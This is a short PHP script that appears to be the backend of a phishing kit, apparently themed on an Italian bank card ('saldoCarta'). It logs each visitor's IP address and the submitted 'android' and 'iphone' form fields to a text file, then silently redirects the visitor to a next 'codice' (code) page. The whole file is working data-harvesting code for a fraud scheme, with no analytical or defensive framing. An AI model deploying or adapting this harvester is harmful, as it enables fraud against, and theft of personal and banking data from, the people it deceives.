<?php
header ('Location:.././codice/');
date_default_timezone_set('Europe/Rome');
$handle = fopen("info.txt", "a");
$date = date('Y-m-d H:i:s');
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
fwrite($handle, "IP: ");
fwrite($handle, $ip);
fwrite($handle, "\r\n");
fwrite($handle, "ANDROID: ");
fwrite($handle, $_POST["android"]);
fwrite($handle, "\r\n");
fwrite($handle, "IPHONE: ");
fwrite($handle, $_POST["iphone"]);
fwrite($handle, "\r\n");
fwrite($handle, "----------------------------------");
fwrite($handle, "\r\n");
fclose($handle);

exit;
?>saldoCarta
